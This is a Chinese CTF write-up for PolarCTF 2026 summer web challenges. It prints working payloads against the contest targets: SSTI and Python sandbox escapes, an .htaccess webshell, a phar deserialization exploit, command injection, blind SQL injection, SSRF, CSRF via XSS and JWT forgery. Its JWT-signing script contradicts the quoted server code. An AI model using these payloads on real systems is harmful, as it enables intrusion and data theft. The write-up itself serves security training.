---
title: PolarCTF2026夏季赛
date: 2026-06-13 20:35:43
tags:
---

## 偷吃蟠桃

上手先玩了一把，第一关很好过，第二关没法过（需要100000分）

前端泄露了JS源码

```js
 function submitResult(score, level, passed) {
      const formData = new URLSearchParams();
      formData.append("score", score);
      formData.append("level", level);
      formData.append("passed", passed);

      fetch("/flag.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: formData.toString()
      })
      .then(res => res.text())
      .then(data => {
        alert("服务器返回:\n" + data);
      })
      .catch(err => {
        alert("请求失败: " + err);
      });
    }

```

### 方法一：利用浏览器控制台调用函数

```
submitResult(1000000, 2, 1);
```

![image-20260613211810692](https://gitee.com/bobrocket/img/raw/master/image-20260613211810692.png)

### 方法二：手动发包

![image-20260613212110278](https://gitee.com/bobrocket/img/raw/master/image-20260613212110278.png)



## 你会渗透吗

test账号登录进去有一张图片，一个社会工程学字典生成器（显示没有权限访问）

![第一次相遇](https://gitee.com/bobrocket/img/raw/master/第一次相遇.png)

这里有squirtle的一些信息，直接访问工具的路径就能下载，用社工字典生成器生成密码爆破

密码是PolarDN138

![image-20260613212348491](https://gitee.com/bobrocket/img/raw/master/image-20260613212348491.png)

可以给管理员发送消息和重置密码，重置密码存在CSRF漏洞：没有验证身份，任何人访问都会重置

既然可以发送消息，我们利用XSS触发

```
<img src="api.php?action=reset_password" style="display:none;">
```

## Top10大考察

注册账号登录，可以新建笔记、搜索、文件上传、文件分享

php网站，笔记应该没有模版渲染漏洞，搜索页提示有WAF，SQL也不太可能。我们把目光放在文件上传

支持的格式有.url并且在文件分享的地方还提示支持图片预览和 .url 快捷方式解析，很明显的SSRF

```
[InternetShortcut]
URL=file:///flag
```

![image-20260613215314139](https://gitee.com/bobrocket/img/raw/master/image-20260613215314139.png)

## 狗黑子的股市之路

进去能买股票，买一次股票亏一半，没发现什么有价值的东西。扫一下目录发现flag.php，需要验证资产，改一下包就出来了

![image-20260613215824743](https://gitee.com/bobrocket/img/raw/master/image-20260613215824743.png)

## 身份权限校验系统

这个题考验脑洞，首页提示需要admin权限（提示：参数中不能出现 admin 关键字），但是探测一番又找不到什么入口

FUZZ参数

![image-20260614142822957](https://gitee.com/bobrocket/img/raw/master/image-20260614142822957.png)

## dariy

有一点小WAF的SSTI，fenjing一把梭

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False
    blacklist = ['os','popen','open','__globals__']
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "cat /f*")
    # config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    # print(f"{config_payload=}")
```

payload：

```
{{(OvO.__eq__['_''_globals__'].sys.modules['o''s']['po''pen']('cat /f*')).read()}}
```

![image-20260614143750377](https://gitee.com/bobrocket/img/raw/master/image-20260614143750377.png)

## uploadfile

一个文件上传，对文件后缀名和文件内容进行检测，过滤了.php和内容包含php代码的文件，可以传htaccess

先上传一个base64编码的一句话木马，再传一个htaccess对木马进行调用即可

```
AddType application/x-httpd-php .txt
php_value auto_append_file php://filter/convert.base64-decode/resource=1.txt
```

## Polar_校园图库

附件有4个php源码

upload.php可以上传图片并且检查文件头，classes.php里面有一个恶意类，view.php可以文件包含但是会检查.php后缀

一开始的思路是用一句话木马伪造文件头然后上传，再用view.php进行包含，但是这样利用不到恶意类并且无法绕过后缀检查实现文件包含

打phar!!!

```php
<?php
class Helper {
    public $type = 'eval';
    public $cmd = 'system("cat /flag");';
}

$phar = new Phar("exp.phar");
$phar->startBuffering();

// 1. 绕过文件头检查：利用 GIF8 的幻数 \x47\x49\x46\x38
$phar->setStub("GIF8" . "<?php __HALT_COMPILER(); ?>");

// 2. 将恶意的 Helper 对象存入元数据
$o = new Helper();
$phar->setMetadata($o);

// 3. 随便添加一个内嵌文件
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

修改后缀名为.jpg上传，利用phar协议实现文件包含并且完美绕过后缀名检查

```
/view.php?file=phar://uploads/2a2512c88f54daed5d4acb5a8695d799.jpg/any.php
```

## BH

```php
<?php
error_reporting(0);
echo "==== It's another order execution. ====<br>";
echo "Carefully look at the purpose of the code before executing any code<br><br>";

$input = $_GET['cmd'];
$command = "ping -c 2 127.0.0.1" . $input;

echo "System executing command：<br>$command<br><br>";

echo "<pre>";
passthru($command);
echo "</pre>";

highlight_file(__FILE__)
```

闭合系统命令即可，不明白为什么设计成必须用命令行

```
curl http://3d29cf4d-e676-42d3-854c-51aec6feb02c.www.polarctf.com:8090/?cmd=%3Bcat%20flag.php
```

![image-20260614155047721](https://gitee.com/bobrocket/img/raw/master/image-20260614155047721.png)

## 路飞成长之路

第1关：吃肉 (`eat_meat.php`)

表单 POST 提交 `meat=1`，达旦提示"有没有更快的方法"。直接篡改 POST 值即可：

```bash
curl -X POST -d "meat=800" http://target/eat_meat.php
```

第2关：恶魔果实 (`devil_fruit.php`)

香克斯提示"橡胶(rubber)的力量(power)"，代码校验的是相反关系：`power=rubber`。

```bash
curl -X POST -d "power=rubber" http://target/devil_fruit.php
```

第3关：二档 (`gear2.php`)

罗宾提示"血液(blood)加速(boost)，限制(limit)解除(unlock)"。

```bash
curl -X POST -d "blood=boost&limit=unlock" http://target/gear2.php
```

第4关：三档 (`gear3.php`)

弗兰奇提示需要请求头 `X-Luffy-Gear3: BoneInflate`。

```bash
curl -H "X-Luffy-Gear3: BoneInflate" http://target/gear3.php
```

第5关：四档 (`gear4.php`)

雷利提示"修行的证明留在浏览器里"，需要两个 Cookie：`gear4=BoundMan` 和 `Trainer=Rayleigh`。

```bash
curl --cookie "gear4=BoundMan; Trainer=Rayleigh" http://target/gear4.php
```

第6关：心境净化 (`clear_seal.php`)

响应头中包含 `Etag: "seal-memory-v1"`。甚平提示"清除之前，先确认它仍是当前状态"。结合 ETag 机制，使用 `DELETE` 方法 + `If-Match` 条件请求头：

```bash
curl -X DELETE -H 'If-Match: "seal-memory-v1"' http://target/clear_seal.php
```

## 七人组档案

主页源码有个隐藏按钮，会跳转到HiNt_.html，注意这里有重定向，不能直接访问，需要用curl

提示可以通过`X-Vought-Token: Homelander`伪装身份

带上这个请求头访问主页就能跳转到/level1/Vought_Internal_system1917.php

这里需要SQL注入注出账号密码

![image-20260615102644225](https://gitee.com/bobrocket/img/raw/master/image-20260615102644225.png)

把数字，ascii，substr()之类的函数给禁了，有点难办啊

true和false返回包的大小不一样，适合盲注

```
id=true&&exists(select*from information_schema.tables where table_schema like database()&&table_name regexp'^m')
```

如果返回真，就说明有表名以 m 开头。

然后就能得到表名members

```
exists(select*from information_schema.columns where table_name like 'members' && column_name regexp '^前缀')
```

得到列名id、member、keyword

```
exists(select*from members where member like 'stanedgar' && keyword regexp '^a')
```

得到密码zpexnlot

![image-20260615144810391](https://gitee.com/bobrocket/img/raw/master/image-20260615144810391.png)

点左边显示权限不够，点右边显示jwt格式不对

左边抓包把cookie中的role改成admin就跳转到code.php了

```php
 <?php
highlight_file(__FILE__);
// ==================== 简单JWT实现 ====================
function base64url_encode($data)
{
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
function base64url_decode($data)
{
    return base64_decode(strtr($data, '-_', '+/'));
}

// JWT签名密钥 (藏在源码里，你有本事就自己签一个令牌！)
$jwt_secret = "Vought_CompoundV";

if (isset($_POST['location'])) {
    $token = $_COOKIE['jwt_token'] ?? '';
    if (empty($token)) {
        echo '<script>alert("缺少JWT令牌！请先获取有效的jwt_token");</script>';
    } else {
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            echo '<script>alert("JWT令牌格式错误！需要三段式: header.payload.signature");</script>';
        } else {
            $header = json_decode(base64url_decode($parts[0]), true);
            $payload = json_decode(base64url_decode($parts[1]), true);
            // 计算有效签名
            $valid_sig = base64url_encode(hash_hmac('sha256', "$parts[0].$parts[1]", $jwt_secret, true));

            if ($header === null || $payload === null) {
                echo '<script>alert("JWT解析失败！header和payload需要是有效JSON的Base64URL编码");</script>';
            } elseif (!hash_equals($valid_sig, $parts[2])) {
                echo '<script>alert("JWT签名验证失败！密钥不匹配");</script>';
            } elseif (!isset($payload['access']) || $payload['access'] !== 'compound_v') {
                echo '<script>alert("JWT权限不足！需要 access = compound_v");</script>';
            } else {
                //......
            }
        }
    }
}

```

还能怎么办，那就自己签一个

```python
import base64
import hashlib
import hmac

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

secret = b"Vought_CompoundV"
header = b'{"alg":"HS256","typ":"JWT"}'
payload = b'{"access":"compound_v"}'

h = b64url(header)
p = b64url(payload)

# 关键点：故意不加点
msg = (h + p).encode()

sig = b64url(hmac.new(secret, msg, hashlib.sha256).digest())

jwt_token = f"{h}.{p}.{sig}"
print(jwt_token)
```

得到

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2Nlc3MiOiJjb21wb3VuZF92In0.ANdvTV4XOHONEhUhUuujsWO06tDdNzM-qR8MPXxH9Qk
```

点右边的获取详细坐标抓包改jwt就能获得坐标，提交

![image-20260615151059502](https://gitee.com/bobrocket/img/raw/master/image-20260615151059502.png)

## Escape，ecape！

[高级漏洞篇之HTTP请求走私专题 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/375462.html)

```
getattr(getattr(getattr(getattr(getattr(getattr((),'_'+'_'+'class'+'_'+'_'),'_'+'_'+'base'+'_'+'_'),'_'+'_'+'sub'+'classes'+'_'+'_')()[142],'_'+'_'+'init'+'_'+'_'),'_'+'_'+'g''lobals'+'_'+'_')['po''pen']('env'),'re'+'ad')()
```













